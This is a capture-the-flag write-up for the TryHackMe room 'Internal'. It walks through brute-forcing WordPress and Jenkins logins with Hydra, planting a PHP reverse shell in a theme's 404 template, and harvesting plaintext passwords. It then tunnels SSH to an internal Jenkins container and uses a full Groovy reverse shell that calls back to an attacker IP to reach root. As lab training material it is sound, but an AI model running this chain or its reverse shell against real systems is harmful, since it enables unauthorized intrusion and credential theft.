# Internal - TryHackMe

> **Kill Chain Summary**:
> Port Scanning (Ports 22, 80) -> Virtual Host Mapping (`internal.thm`) -> WordPress Login Brute-Force via Hydra (`admin:my2boys`) -> Theme Editor 404 Shell -> Low-Privilege Shell as `www-data` -> Credential Discovery in `/opt/wp-save.txt` -> Lateral Movement to `aubreanna` -> Local Network Enumeration (Internal Jenkins Docker Container on `172.17.0.2:8080`) -> SSH Local Port Forwarding -> Jenkins Login Brute-Force (`admin:spongebob`) -> Jenkins Groovy Script Console RCE -> Shell in Docker Container -> Discovery of Root Password in `/opt/note.txt` -> Root Switch on Host (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Internal |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu 18.04) |
| **Difficulty** | Hard |
| **Status** | Rooted |
| **Key Techniques** | Virtual Host Mapping, WordPress Hydra Brute-Force, Theme 404 Shell, Credential Harvesting, SSH Port Forwarding, Jenkins Groovy RCE, Docker Inspection |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was performed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.10.170.90 10.10.170.90
```

**Open Ports:**
- **Port 22:** OpenSSH 7.6p1 (Ubuntu Linux)
- **Port 80:** Apache httpd 2.4.29 (Ubuntu)

### 1.2 Web Directory Enumeration & Virtual Host Configuration

Fuzzing directories with Gobuster on port 80:

```bash
gobuster dir -u http://10.10.170.90/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/blog                (Status: 301) [--> http://10.10.170.90/blog/]
/phpmyadmin          (Status: 301) [--> http://10.10.170.90/phpmyadmin/]
/wordpress           (Status: 301) [--> http://10.10.170.90/wordpress/]
```

Accessing `http://10.10.170.90/blog/` redirects resources and links to `internal.thm`, causing broken formatting.

> [!NOTE] Concept: Virtual Host Name Resolution
> WordPress sites configured with a specific domain name in `siteurl` require matching Host headers. Map the hostname to the target IP inside `/etc/hosts`:

```bash
echo "10.10.170.90 internal.thm" | sudo tee -a /etc/hosts
```

---

## 2. Initial Access

### 2.1 WordPress Administrative Brute-Force

Navigating to `http://internal.thm/blog/wp-login.php` displays the login interface. Testing username `admin` confirms user existence due to error message differences (`The password you entered for the username admin is incorrect`).

Brute-force the password for `admin` using Hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-post-form \
  "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=The password you entered"
```

```text
[80][http-post-form] host: internal.thm   login: admin   password: my2boys
1 of 1 target completed, 1 valid password found
```

Valid credentials:
- **Username:** `admin`
- **Password:** `my2boys`

### 2.2 Remote Code Execution via Theme Editor

1. Authenticate to the WordPress administrative dashboard at `http://internal.thm/blog/wp-login.php`.
2. Navigate to **Appearance -> Theme Editor**.
3. Select `404.php` (404 Template) under the active theme (Twenty Seventeen).
4. Replace the file contents with a standard PHP reverse shell payload.
5. Start a Netcat listener:

```bash
nc -lvnp 4444
```

6. Trigger execution by visiting a non-existent URL:

```bash
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

The listener catches the reverse shell:

```text
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.170.90] 48112
www-data@internal:/$ whoami
www-data
```

---

## 3. Privilege Escalation

### 3.1 Local Credential Harvesting

Enumerating system directories for sensitive files:

```bash
cat /opt/wp-save.txt
```

```text
Aubreanna needed these credentials for something later.
aubreanna:bubb13guM!@#123
```

Discovered credentials:
- **Username:** `aubreanna`
- **Password:** `bubb13guM!@#123`

### 3.2 Switching User

Upgrade to a stable interactive PTY and authenticate as `aubreanna`:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
su aubreanna
```

Alternatively, establish a clean SSH connection:

```bash
ssh aubreanna@internal.thm
```

Supply password `bubb13guM!@#123` when prompted.

Retrieve the user flag:

```bash
cat /home/aubreanna/user.txt
```

```text
[FLAG REDACTED]
```

---

### Privilege Escalation

### 4.1 Internal Network Discovery & SSH Local Port Forwarding

Inspecting files in `aubreanna`'s home directory reveals `jenkins.txt`:

```bash
cat /home/aubreanna/jenkins.txt
```

```text
Internal Jenkins service is running on 172.17.0.2:8080
```

The host runs a Docker bridge network (`172.17.0.0/16`) hosting an internal Jenkins instance accessible only from localhost.

Create an SSH local port forwarding tunnel from Kali:

```bash
ssh -L 3333:172.17.0.2:8080 aubreanna@internal.thm
```

All traffic directed to `http://localhost:3333` on Kali is forwarded through the SSH tunnel to the internal Jenkins container.

### 4.2 Jenkins Authentication Brute-Force

Navigating to `http://localhost:3333/` presents the Jenkins login screen.

Inspecting network requests in developer tools reveals that the form posts to `/j_acegi_security_check` with parameters `j_username`, `j_password`, and hidden field `from=%2F`.

Brute-force Jenkins administrative credentials via Hydra through the forwarded port:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 3333 http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:F=Invalid username or password"
```

```text
[3333][http-post-form] host: localhost   login: admin   password: spongebob
```

Valid Jenkins credentials:
- **Username:** `admin`
- **Password:** `spongebob`

### 4.3 Groovy Script Console RCE (Docker Container)

1. Log in to Jenkins at `http://localhost:3333/`.
2. Navigate to **Manage Jenkins -> Script Console**.
3. Execute an arbitrary Java/Groovy reverse shell payload:

```groovy
String host="10.10.14.5";
int port=5555;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new java.net.Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try{p.exitValue();break;}catch(Exception e){}
};
p.destroy();s.close();
```

4. Catch the reverse shell on a Netcat listener:

```bash
nc -lvnp 5555
```

```text
listening on [any] 5555 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.170.90] 38472
jenkins@7bf...:/$ whoami
jenkins
```

### 4.4 Docker Credential Recovery and Root Escalation

Enumerate files inside the Docker container:

```bash
ls -la /opt
cat /opt/note.txt
```

```text
root:tr0ub13guM!@#123
```

The note stores the host system's root password.

Return to the active SSH session on the target host as `aubreanna` and authenticate as `root`:

```bash
su root
```

Supply password `tr0ub13guM!@#123` when prompted:

```bash
root@internal:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Retrieve the root flag:

```bash
cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# SSH Local Port Forwarding Tunnel
ssh -L <LOCAL_PORT>:<INTERNAL_IP>:<INTERNAL_PORT> <USER>@<REMOTE_HOST>

# Hydra Form Brute-Force against Tunneled Service
hydra -l <USER> -P <WORDLIST> localhost -s <LOCAL_PORT> http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid"

# WordPress Theme 404 Shell Injection URL
http://<VHOST>/wp-content/themes/<THEME>/404.php
```

---

## 5. Key Takeaways and Lessons Learned

1. **Virtual Host Requirements:** Web applications that utilize domain-specific redirection fail to render properly without matching Host headers. When Gobuster or browser responses redirect to a hostname, immediately add it to `/etc/hosts`.
2. **SSH Local Port Forwarding:** Isolated Docker containers and loopback services (`127.0.0.1`, `172.17.0.0/16`) can be mapped directly to attacker interfaces via `ssh -L`, permitting full interaction and web exploitation.
3. **Container-to-Host Credential Pivot:** Staging files in container filesystems (`/opt`, `/tmp`, `/root`) often contain shared administrator credentials or infrastructure notes that unlock access on the hosting bare-metal operating system.

---

#tryhackme #linux #hard #wordpress #hydra #ssh-tunneling #port-forwarding #jenkins #groovy #docker #credential-harvesting #privesc